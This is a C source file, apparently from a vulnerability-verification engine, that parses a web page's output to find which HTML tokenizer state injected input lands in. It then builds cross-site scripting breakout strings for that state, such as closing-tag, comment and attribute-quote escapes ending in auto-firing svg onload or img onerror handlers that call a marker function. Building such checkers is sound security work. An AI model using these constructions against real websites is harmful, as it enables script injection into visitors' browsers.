/* THE @S HTML-CONTEXT BREAKOUT, CONSTRUCTED — see solve_html.h for why there is no payload list here.
   Every state named below is WHATWG HTML §13.2.5 (https://html.spec.whatwg.org/multipage/parsing.html); the
   escape for each is that state's own exit transition, not a vector chosen beside it. */
#include "solver/solve_html.h"
#include "check.h"
#include <lexbor/html/html.h>
#include <lexbor/dom/dom.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "core/dom/node_interface.h"   /* the ONE place a Document is made — see that header */
#include "core/html/html_parse.h"      /* …and the ONE place one is parsed, which owns the tokens it produces */

/* THE ELIDE TOKEN MUST BE THE LOCATOR'S LENGTH, because renaming the other occurrences is how each occurrence
   is measured in its own state and the rename must not move a single byte offset. Checked by the compiler
   rather than at runtime: a length that stops matching is an edit, not a state a run can reach. */
typedef char solve_html_tokens_are_the_same_length[
    (sizeof SOLVE_HTML_ELIDE == sizeof SOLVE_HTML_LOCATOR) ? 1 : -1];

/* WHERE THE LOCATOR LANDED, as the REAL parse reports it. The three NAME kinds are separated from the value
   kinds deliberately: a hole in an attribute NAME (§13.2.5.33) or a tag NAME (§13.2.5.8) is a different
   escape problem from a hole in a VALUE, and collapsing them would make the derivation answer the value's
   escape for a context it does not fit. */
enum { LOC_NONE = 0, LOC_TEXT, LOC_COMMENT, LOC_CDATA, LOC_ATTR_VALUE, LOC_ATTR_NAME, LOC_TAG_NAME };

/* Every field points INTO the parsed document and is valid only while it lives — deliberately, because a copy
   would need a bound on an element name that has none (a custom element's name is arbitrarily long). */
typedef struct {
    int kind;
    const lxb_char_t *tag;  size_t tag_n;    /* the element holding it: a text node's PARENT, an attribute's OWNER */
    const lxb_char_t *attr; size_t attr_n;   /* the attribute's name  — LOC_ATTR_VALUE / LOC_ATTR_NAME only */
    const lxb_char_t *val;  size_t val_n;    /* the attribute's value — LOC_ATTR_VALUE only */
    lxb_dom_element_t *el;                   /* the owning element    — LOC_ATTR_VALUE only */
} Locate;

/* THE TOKENIZER STATE the attacker's bytes are in. Named after §13.2.5's own states because the escape is that
   state's exit transition — the names are the derivation, not documentation of it. */
typedef enum {
    HOLE_DATA = 0,        /* §13.2.5.1  data state */
    HOLE_RCDATA,          /* §13.2.5.2  RCDATA state */
    HOLE_RAWTEXT,         /* §13.2.5.3  RAWTEXT state */
    HOLE_SCRIPT_DATA,     /* §13.2.5.4  script data state */
    HOLE_PLAINTEXT,       /* §13.2.5.5  PLAINTEXT state — no exit transition exists */
    HOLE_COMMENT,         /* §13.2.5.45 comment state */
    HOLE_ATTR_DOUBLE,     /* §13.2.5.36 attribute value (double-quoted) state */
    HOLE_ATTR_SINGLE,     /* §13.2.5.37 attribute value (single-quoted) state */
    HOLE_ATTR_UNQUOTED    /* §13.2.5.38 attribute value (unquoted) state */
} HoleState;

static int mem_has(const lxb_char_t *h, size_t n, const char *needle) {
    size_t m = strlen(needle), i;
    if (!h || n < m) return 0;
    for (i = 0; i + m <= n; i++) if (!memcmp(h + i, needle, m)) return 1;
    return 0;
}
static int name_is(const lxb_char_t *t, size_t n, const char *lit) {
    return t && strlen(lit) == n && !memcmp(t, lit, n);
}

/* Document order without a C frame per level — the tree's depth is the CANDIDATE'S data (a breakout that nests
   a million divs is exactly the input this walk exists to read), so descending by recursion would make the
   derivation's own stack attacker-controlled. Lexbor's nodes carry `parent`, so the walk needs no stack. */
static lxb_dom_node_t *walk_next(lxb_dom_node_t *n, const lxb_dom_node_t *root) {
    if (n->first_child) return n->first_child;
    while (n && n != root) {
        if (n->next) return n->next;
        n = n->parent;
    }
    return NULL;
}

/* FIND THE LOCATOR IN THE PARSED TREE. Reports only what the parse says; it never asserts, because the same
   walk runs over the discrimination re-parses below, where a locator the injected character moved is an
   ANSWER rather than a gap. The base parse's caller is what turns an unnameable context into a crash. */
static int locate(lxb_html_document_t *doc, Locate *out) {
    lxb_dom_node_t *root = lxb_dom_interface_node(&doc->dom_document);
    lxb_dom_node_t *n;

    memset(out, 0, sizeof *out);
    for (n = root->first_child; n; n = walk_next(n, root)) {
        if (n->type == LXB_DOM_NODE_TYPE_ELEMENT) {
            lxb_dom_element_t *el = lxb_dom_interface_element(n);
            lxb_dom_attr_t *a;
            size_t tl = 0;
            const lxb_char_t *tn = lxb_dom_element_qualified_name(el, &tl);

            if (mem_has(tn, tl, SOLVE_HTML_LOCATOR)) {
                out->kind = LOC_TAG_NAME; out->tag = tn; out->tag_n = tl;
                return 1;
            }
            for (a = lxb_dom_element_first_attribute(el); a; a = lxb_dom_element_next_attribute(a)) {
                size_t al = 0, vl = 0;
                const lxb_char_t *an = lxb_dom_attr_qualified_name(a, &al);
                const lxb_char_t *av = lxb_dom_attr_value(a, &vl);

                if (mem_has(an, al, SOLVE_HTML_LOCATOR)) {
                    out->kind = LOC_ATTR_NAME;
                    out->tag = tn; out->tag_n = tl; out->attr = an; out->attr_n = al;
                    return 1;
                }
                if (mem_has(av, vl, SOLVE_HTML_LOCATOR)) {
                    out->kind = LOC_ATTR_VALUE; out->el = el;
                    out->tag = tn; out->tag_n = tl; out->attr = an; out->attr_n = al;
                    out->val = av; out->val_n = vl;
                    return 1;
                }
            }
            continue;
        }
        if (n->type == LXB_DOM_NODE_TYPE_TEXT || n->type == LXB_DOM_NODE_TYPE_COMMENT ||
            n->type == LXB_DOM_NODE_TYPE_CDATA_SECTION) {
            const lxb_dom_character_data_t *cd = (const lxb_dom_character_data_t *)n;

            if (!mem_has(cd->data.data, cd->data.length, SOLVE_HTML_LOCATOR)) continue;
            if (n->type == LXB_DOM_NODE_TYPE_COMMENT) out->kind = LOC_COMMENT;
            else if (n->type == LXB_DOM_NODE_TYPE_CDATA_SECTION) out->kind = LOC_CDATA;
            else {
                out->kind = LOC_TEXT;
                if (n->parent && n->parent->type == LXB_DOM_NODE_TYPE_ELEMENT)
                    out->tag = lxb_dom_element_qualified_name(lxb_dom_interface_element(n->parent), &out->tag_n);
            }
            return 1;
        }
    }
    return 0;
}

/* WHICH STATE AN ELEMENT'S TEXT CONTENT IS TOKENIZED IN — the call sites of §13.2.6's own generic RCDATA and
   generic raw text element parsing algorithms, read off the spec rather than remembered: "in head" gives
   `title` to the RCDATA algorithm and `noframes`/`style` to the raw text one, "in body" gives `textarea` the
   RCDATA state directly and `xmp`/`iframe`/`noembed` the raw text algorithm, and `script` runs its own steps
   into §13.2.5.4. `noscript` is RAWTEXT only when scripting is enabled, which in this engine it always is —
   the engine's whole purpose is running the page's scripts. */
static HoleState text_state_of(const lxb_char_t *tag, size_t n) {
    if (name_is(tag, n, "title") || name_is(tag, n, "textarea")) return HOLE_RCDATA;
    if (name_is(tag, n, "style") || name_is(tag, n, "xmp") || name_is(tag, n, "iframe") ||
        name_is(tag, n, "noembed") || name_is(tag, n, "noframes") || name_is(tag, n, "noscript"))
        return HOLE_RAWTEXT;
    if (name_is(tag, n, "script")) return HOLE_SCRIPT_DATA;
    if (name_is(tag, n, "plaintext")) return HOLE_PLAINTEXT;
    return HOLE_DATA;
}

/* WHICH ELEMENTS AUTO-FIRE AN EVENT HANDLER WITH NO USER INTERACTION — a BROWSER FACT, the same kind of fact
   as the RAWTEXT list above, and the reason a constructed escape ends in an executable position instead of a
   guessed payload. §@S: only FIRING proves a PoC, and `onmouseover` needs a click, so a handler that needs one
   is not on this list at any cost.
   `resource` is the attribute whose value must FAIL for the event to be dispatched, or NULL where the element
   fires on insertion alone. It is load-bearing twice: it says which element the DATA-state escape injects (the
   minimal one is the one needing no resource), and it says whether a `<`-free injection onto an element that is
   ALREADY there can fire at all — adding `onerror` to an <img> whose src still loads fires nothing, so the
   vector exists only when the hole sits in that very attribute and the payload's own bytes break it. */
static const struct { const char *tag; const char *event; const char *resource; } AUTOFIRE[] = {
    { "svg",    "onload",  NULL   },   /* SVG2: the svg element fires `load` when inserted; no resource needed */
    { "iframe", "onload",  NULL   },   /* HTML §4.8.5: a srcless iframe loads about:blank and fires `load` */
    { "img",    "onerror", "src"  },
    { "input",  "onerror", "src"  },
    { "embed",  "onerror", "src"  },
    { "source", "onerror", "src"  },
    { "audio",  "onerror", "src"  },
    { "video",  "onerror", "src"  },
    { "link",   "onerror", "href" },
    { "object", "onerror", "data" },
};
#define AUTOFIRE_N ((int)(sizeof AUTOFIRE / sizeof AUTOFIRE[0]))

static int autofire_of(const lxb_char_t *tag, size_t n) {
    int i;
    for (i = 0; i < AUTOFIRE_N; i++) if (name_is(tag, n, AUTOFIRE[i].tag)) return i;
    return -1;
}

/* DOES THIS ELEMENT ALREADY CARRY THE ATTRIBUTE — asked of the element the PROBE parse put the hole in, which
   is the same element the breakout run builds, because the template around the hole is the page's and does not
   change between two candidate runs. It decides whether the resource an `onerror` needs can be SUPPLIED: HTML
   §13.2.5.33 "Attribute name state" says that when a token already has an attribute of the same name "this is a
   duplicate-attribute parse error and the new attribute must be removed from the token", so a second `src`
   is discarded and the page's own one still loads. Where there is none, the escape brings its own. */
static int has_attribute(lxb_dom_element_t *el, const char *name) {
    size_t vl = 0;
    return el && lxb_dom_element_get_attribute(el, (const lxb_char_t *)name, strlen(name), &vl) != NULL;
}

/* THE MINIMAL AUTO-FIRING ELEMENT, chosen by a RULE rather than written down: the first row of the table above
   that fires with no resource to break. An <img> is not minimal — it needs a src that fails — and that is the
   whole of why it is not what a data-state escape injects.
   ITS SEPARATOR IS CHOSEN THE SAME WAY THE ATTRIBUTE ESCAPES CHOOSE THEIRS, off the same §13.2.5 transition
   pair: §13.2.5.8 "Tag name state" leaves on whitespace to §13.2.5.32 "Before attribute name state" AND on
   U+002F SOLIDUS to §13.2.5.40 "Self-closing start tag state", whose "Anything else" is a parse error that
   RECONSUMES in the before attribute name state — so `<svg/onload=X9()>` is the spelling for a source that
   cannot carry a space. Answers 0 when no spelling of it survives this source, which is a search that has not
   solved and not a capability that is missing. */
static int firing_element(char *b, size_t n, const SolveDelivered *d) {
    const char *sep = solve_delivered_byte(d, ' ') ? " " : solve_delivered_byte(d, '/') ? "/" : NULL;
    int i;

    if (!sep || !solve_delivered_byte(d, '<') || !solve_delivered_byte(d, '>')) { b[0] = 0; return 0; }
    for (i = 0; i < AUTOFIRE_N; i++)
        if (!AUTOFIRE[i].resource) {
            int k = snprintf(b, n, "<%s%s%s=X9()>", AUTOFIRE[i].tag, sep, AUTOFIRE[i].event);
            CHECK(k > 0 && (size_t)k < n, "solve_html: the firing element did not fit its buffer");
            return 1;
        }
    DFAIL("no element in the auto-fire table fires on insertion alone, so a data-state escape has no element "
          "to inject and every HTML breakout this file constructs is unfireable - restore the row for an "
          "element that dispatches a handler with no resource and no interaction");
    b[0] = 0;
    return 0;
}

/* AN ESCAPE THE SOURCE CANNOT CARRY IS NOT EMITTED, and this is the one place that decides it — every
   construction below goes through here, so a spelling chosen for one byte cannot smuggle another past the
   constraint. Declining is not a swallowed condition: the candidate would re-run the whole document to arrive
   percent-encoded at its own sink, which is a search state solve.h already reports (`survivedBy` against
   `sourceEncodes`) and never a fire. Answers whether it emitted, so `n` counts escapes that exist. */
static int emit_one(SolveHtmlEmit emit, void *user, int *n, const SolveDelivered *d, const char *fmt, ...) {
    char b[512];
    va_list ap;
    int k;

    va_start(ap, fmt);
    k = vsnprintf(b, sizeof b, fmt, ap);
    va_end(ap);
    CHECK(k > 0 && (size_t)k < sizeof b, "solve_html: a constructed breakout did not fit its buffer");
    if (!solve_delivered_ok(d, b)) return 0;
    emit(user, b);
    (*n)++;
    return 1;
}

/* THE ONE FACT THE DOM DOES NOT RECORD — which of §13.2.5.36/.37/.38 an attribute value is in — asked of the
   REAL PARSER instead of scanned for by hand. A hand scan backwards from the hole for a quote is defeated by
   the first `<div title="a > b" id={}>` it meets; the tokenizer is not, and it is already here.
   The question put to it is the state's own EXIT transition: splice the character that would end THIS state in
   right behind the locator and re-parse. The quote that OPENED the value truncates it there (§13.2.5.36/.37);
   the other quote is an ordinary character in the other quoted state and a parse-error-but-kept character in
   the unquoted one (§13.2.5.38), so it is still in the value afterwards. */
static char *splice(const char *s, size_t at, const char *ins, size_t *plen) {
    size_t n = strlen(s), m = strlen(ins);
    char *out = malloc(n + m + 1);

    CHECK(out != NULL, "solve_html: OOM splicing an attribute-state discrimination probe");
    memcpy(out, s, at);
    memcpy(out + at, ins, m);
    memcpy(out + at + m, s + at, n - at + 1);
    *plen = n + m;
    return out;
}

static int quote_ends_value(const char *witness, size_t at, char q) {
    char ins[2];
    size_t wl = 0;
    char *w;
    lxb_html_document_t *doc;
    int ends = 0;

    ins[0] = q; ins[1] = 0;
    w = splice(witness, at, ins, &wl);
    doc = dom_document_create();
    CHECK(doc != NULL, "solve_html: OOM creating an attribute-state discrimination parse");
    if (html_parse_document(doc, DOM_PARSE_ROOT_PRIVATE, (const lxb_char_t *)w, wl) == LXB_STATUS_OK) {
        Locate lo;
        if (locate(doc, &lo) && lo.kind == LOC_ATTR_VALUE)
            ends = memchr(lo.val, q, lo.val_n) == NULL;
    }
    dom_document_destroy(doc);
    free(w);
    return ends;
}

/* …AND THE THIRD STATE'S EXIT, which is not a quote: §13.2.5.38 leaves an UNQUOTED value on whitespace and
   goes to the before attribute name state, so a name spliced in behind a space becomes a real attribute of the
   same element exactly when the value was unquoted. In either quoted state the space and the name are simply
   more value. */
static int space_starts_attribute(const char *witness, size_t at) {
    size_t wl = 0;
    char *w = splice(witness, at, " " SOLVE_HTML_PAD, &wl);
    lxb_html_document_t *doc = dom_document_create();
    int found = 0;

    CHECK(doc != NULL, "solve_html: OOM creating an attribute-state discrimination parse");
    if (html_parse_document(doc, DOM_PARSE_ROOT_PRIVATE, (const lxb_char_t *)w, wl) == LXB_STATUS_OK) {
        Locate lo;
        if (locate(doc, &lo) && lo.kind == LOC_ATTR_VALUE && lo.el) {
            lxb_dom_attr_t *a;
            for (a = lxb_dom_element_first_attribute(lo.el); a; a = lxb_dom_element_next_attribute(a)) {
                size_t al = 0;
                const lxb_char_t *an = lxb_dom_attr_qualified_name(a, &al);
                if (name_is(an, al, SOLVE_HTML_PAD)) { found = 1; break; }
            }
        }
    }
    dom_document_destroy(doc);
    free(w);
    return found;
}

static HoleState attr_state_of(const char *witness, size_t at) {
    int dq = quote_ends_value(witness, at, '"');
    int sq = quote_ends_value(witness, at, '\'');
    int uq = space_starts_attribute(witness, at);

    DCHECK(dq + sq + uq == 1,
           "the real parser did not agree with itself about which attribute-value state holds the attacker "
           "bytes - HTML 13.2.5.36/.37/.38 are the only three and they are mutually exclusive, so exactly one "
           "of the three exit-transition re-parses must end the value");
    if (dq) return HOLE_ATTR_DOUBLE;
    if (sq) return HOLE_ATTR_SINGLE;
    return HOLE_ATTR_UNQUOTED;
}

/* THE ESCAPE IS THE STATE'S OWN EXIT TRANSITION. Nothing here is chosen; each line is the byte sequence
   §13.2.5 defines as leaving that state, followed by the firing element the table above derives.
   WHERE A STATE HAS TWO EXIT SPELLINGS, THE SOURCE PICKS — see `d` in solve_html.h. That is not a preference
   between equals: §13.2.5.39 "After attribute value (quoted) state" leaves on whitespace and on U+002F SOLIDUS,
   every percent-encode set in URL §1.3 "Percent-encoded bytes" holds SPACE and none of them holds the solidus,
   so for a fragment- or query-carried payload the two spellings are the difference between an escape and no
   escape at all. */
static int construct(HoleState st, const Locate *lo, const SolveDelivered *d, SolveHtmlEmit emit, void *user) {
    char fire[96], tail[64];
    const char *q, *sep, *vq, *ev, *res;
    int n = 0, af, have_fire;

    have_fire = firing_element(fire, sizeof fire, d);
    switch (st) {
    case HOLE_DATA:
        /* §13.2.5.1: a `<` here is already the tag open state, so the escape IS the firing element. */
        if (have_fire) emit_one(emit, user, &n, d, "%s", fire);
        return n;
    case HOLE_RCDATA:
    case HOLE_RAWTEXT:
    case HOLE_SCRIPT_DATA:
        /* §13.2.5.2/.3/.4 leave only through their less-than-sign states, and §13.2.5.11/.14/.17 emit an end
           tag only for the APPROPRIATE one — the element whose start tag opened the state. So the escape is
           that element's end tag and nothing shorter. */
        if (have_fire)
            emit_one(emit, user, &n, d, "</%.*s>%s", (int)lo->tag_n, (const char *)lo->tag, fire);
        return n;
    case HOLE_PLAINTEXT:
        /* §13.2.5.5 consumes every remaining character of the input and has no transition out at all. There is
           no escape to construct — not one this file has not built yet, one that does not exist — so the
           search is honestly parked with nothing tried. */
        return 0;
    case HOLE_COMMENT:
        /* §13.2.5.45 -> .50 comment end dash -> .51 comment end, which emits on `>`. */
        if (have_fire) emit_one(emit, user, &n, d, "-->%s", fire);
        return n;
    case HOLE_ATTR_DOUBLE:
    case HOLE_ATTR_SINGLE:
    case HOLE_ATTR_UNQUOTED:
        break;
    }
    q = st == HOLE_ATTR_DOUBLE ? "\"" : st == HOLE_ATTR_SINGLE ? "'" : "";
    /* TAG INJECTION: end the value with the quote that opened it (nothing, when it was unquoted — §13.2.5.38
       gives `>` its own transition straight to the data state), close the tag, inject the firing element. */
    if (have_fire) emit_one(emit, user, &n, d, "%s>%s", q, fire);
    /* …AND THE SAME STATE WITHOUT A `<`, which is a SECOND escape rather than a second guess: §@S(2) is about
       which bytes SURVIVE to the sink, and a source (or a filter) that eats `<` kills the vector above while
       leaving this one — a handler added to the element the hole is already inside. It exists only where that
       element dispatches something on its own, which is what the table above answers. */
    af = autofire_of(lo->tag, lo->tag_n);
    if (af < 0) return n;
    ev = AUTOFIRE[af].event;
    res = AUTOFIRE[af].resource;
    /* THE SEPARATOR BETWEEN THE CLOSED VALUE AND THE NEXT ATTRIBUTE NAME, which is where §13.2.5 gives two
       spellings and where a written-down one made the whole family unsatisfiable from a fragment.
         - whitespace: §13.2.5.39 "After attribute value (quoted) state" switches to §13.2.5.32 "Before
           attribute name state" directly. It is also the ONLY exit an UNQUOTED value has — §13.2.5.38
           "Attribute value (unquoted) state" leaves on whitespace, `&` and `>` and appends everything else,
           the solidus included — which is why the second spelling is offered only where a quote closed one.
         - U+002F SOLIDUS: §13.2.5.39 switches to §13.2.5.40 "Self-closing start tag state", whose "Anything
           else" is an unexpected-solidus-in-tag parse error that RECONSUMES in the before attribute name
           state. §13.2 tree construction is error-recovering, so that recovery is the normative behaviour and
           not a quirk. */
    sep = solve_delivered_byte(d, ' ') ? " " : (*q && solve_delivered_byte(d, '/')) ? "/" : NULL;
    if (!sep) return n;
    /* …AND WHAT THAT CHOICE COSTS THE VALUES. Reaching §13.2.5.39 again is what makes a solidus a separator at
       all, and only a QUOTED value gets there; an unquoted one would swallow the solidus and everything after
       it as more value. So the solidus spelling quotes every value it writes, and the whitespace spelling
       leaves them as they were. */
    vq = *sep == '/' ? q : "";
    /* THE TEMPLATE'S OWN CLOSING QUOTE IS ABSORBED BY A FILLER ATTRIBUTE, or there is none to absorb: an
       unquoted hole has no trailing quote of the page's to land inside. */
    if (*q) {
        int k = snprintf(tail, sizeof tail, "%s%s=%s", sep, SOLVE_HTML_PAD, q);
        CHECK(k > 0 && (size_t)k < sizeof tail, "solve_html: the escape's filler attribute did not fit");
    } else {
        tail[0] = 0;
    }
    if (!res) {
        /* Fires on insertion alone — the handler is the whole escape. */
        emit_one(emit, user, &n, d, "%s%s%s=%sX9()%s%s", q, sep, ev, vq, vq, tail);
    } else if (name_is(lo->attr, lo->attr_n, res)) {
        /* THE HOLE IS THE RESOURCE, so the payload's own leading byte breaks it — §@S: `onerror` on an EMPTY
           src never errors, so an escape that leaves the value empty fires nothing and would be recorded as a
           search that failed for the wrong reason. */
        emit_one(emit, user, &n, d, "x%s%s%s=%sX9()%s%s", q, sep, ev, vq, vq, tail);
    } else if (!has_attribute(lo->el, res)) {
        /* THE ELEMENT NEEDS A RESOURCE AND HAS NONE, so the escape SUPPLIES one that fails. This is the case a
           rule reading "only where the hole sits in that very attribute" refused, and refusing it is what left
           `<img alt='{hole}'>` with no `<`-free escape at all: the img dispatches `error` for a src that does
           not load, and an element carrying no src yet is one this escape may give a src to. Where it already
           carries one, §13.2.5.33's duplicate-attribute rule discards ours and the page's still loads — which
           is why the question is asked of the element and not assumed either way. */
        emit_one(emit, user, &n, d, "%s%s%s=%sx%s%s%s=%sX9()%s%s",
                 q, sep, res, vq, vq, sep, ev, vq, vq, tail);
    }
    return n;
}

/* ONE OCCURRENCE: parse the witness, name the state its bytes are in, construct that state's escape. A state
   with no escape rule CRASHES here naming itself — that is the work queue, and it is a different thing from a
   search that has not solved (CLAUDE.md forbids asserting on THAT). */
static int breakouts_at(const char *witness, size_t after, const SolveDelivered *d,
                        SolveHtmlEmit emit, void *user) {
    lxb_html_document_t *doc = dom_document_create();
    Locate lo;
    int n = 0;

    CHECK(doc != NULL, "solve_html: OOM parsing a sink output for its breakout context");
    if (html_parse_document(doc, DOM_PARSE_ROOT_PRIVATE,
                            (const lxb_char_t *)witness, strlen(witness)) != LXB_STATUS_OK) {
        dom_document_destroy(doc);
        DFAIL("the real HTML parser refused a string an HTML sink was handed - HTML 13.2 makes every byte "
              "sequence a parseable document, so this is Lexbor reporting an allocation failure and the "
              "derivation has just measured nothing");
        return 0;
    }
    if (!locate(doc, &lo)) {
        dom_document_destroy(doc);
        DFAIL("the sink output carries the @S context locator but the real parse put it in no element, "
              "attribute, text, comment or CDATA node - the states that consume bytes and produce no node are "
              "the DOCTYPE states (13.2.5.53-.68), the processing-instruction states (13.2.5.72-.76), and an "
              "unterminated tag whose eof-in-tag parse error discards the whole token; build the escape for "
              "the one this document put it in");
        return 0;
    }
    switch (lo.kind) {
    case LOC_TEXT:
        n = construct(text_state_of(lo.tag, lo.tag_n), &lo, d, emit, user);
        break;
    case LOC_COMMENT:
        n = construct(HOLE_COMMENT, &lo, d, emit, user);
        break;
    case LOC_ATTR_VALUE:
        DCHECK(lo.el != NULL,
               "the real parse reported the attacker bytes in an attribute VALUE and named no element "
               "that owns it — the escape asks the owner whether it already carries the resource its own "
               "handler needs (HTML 13.2.5.33 duplicate-attribute), so a value with no owner would be "
               "given one blind");
        n = construct(attr_state_of(witness, after), &lo, d, emit, user);
        break;
    case LOC_ATTR_NAME:
        DFAIL("the attacker bytes land in an attribute NAME (HTML 13.2.5.33), and the escape for that state "
              "is not the value escape - a name is left by whitespace, `/` or `>` into 13.2.5.32 before "
              "attribute name, so the breakout is a handler NAME plus its value and it has to be built");
        break;
    case LOC_TAG_NAME:
        DFAIL("the attacker bytes land in a tag NAME (HTML 13.2.5.8) - the element itself is attacker-chosen, "
              "so the breakout is not an escape at all but a choice of element and handler, and it has to be "
              "built");
        break;
    case LOC_CDATA:
        DFAIL("the attacker bytes land in a CDATA section (HTML 13.2.5.69), which foreign content reaches and "
              "which leaves only through 13.2.5.70/.71 on `]]>` - build that escape");
        break;
    default:
        DFAIL("the locator was placed by a node kind this derivation does not name");
        break;
    }
    dom_document_destroy(doc);
    return n;
}

int solve_html_breakouts(const char *output, const SolveDelivered *d, SolveHtmlEmit emit, void *user) {
    size_t loclen = sizeof SOLVE_HTML_LOCATOR - 1, olen;
    const char *p;
    int n = 0;

    DCHECK(output != NULL && emit != NULL && d != NULL,
           "the HTML breakout derivation was asked for the context of nothing, with nowhere to put what it "
           "derives, or with no statement of which bytes this source can carry — the constraint is half the "
           "solve (see solve_html.h), so a derivation without one constructs escapes that cannot arrive");
    DCHECK(strstr(output, SOLVE_HTML_LOCATOR) != NULL,
           "the HTML breakout derivation was handed a sink output that does not carry the context locator - "
           "the probe candidate substitutes it AT THE SOURCE, so an output without it is a write the probe "
           "never reached and there is no context in it to read");
    olen = strlen(output);
    for (p = output; (p = strstr(p, SOLVE_HTML_LOCATOR)) != NULL; p += loclen) {
        size_t off = (size_t)(p - output);
        char *w = malloc(olen + 1), *q;

        CHECK(w != NULL, "solve_html: OOM building the witness for one locator occurrence");
        memcpy(w, output, olen + 1);
        /* EACH OCCURRENCE IS MEASURED IN ITS OWN STATE. A page that writes the source's value twice puts it in
           two contexts, and one payload has to break out of whichever one it is read in — so every other
           occurrence is renamed to the same-length inert token and this one is the only locator in the parse.
           Each context contributes its own candidate; the ONE that fires is the verified PoC. */
        for (q = w; (q = strstr(q, SOLVE_HTML_LOCATOR)) != NULL; q += loclen)
            if ((size_t)(q - w) != off) memcpy(q, SOLVE_HTML_ELIDE, loclen);
        n += breakouts_at(w, off + loclen, d, emit, user);
        free(w);
    }
    return n;
}
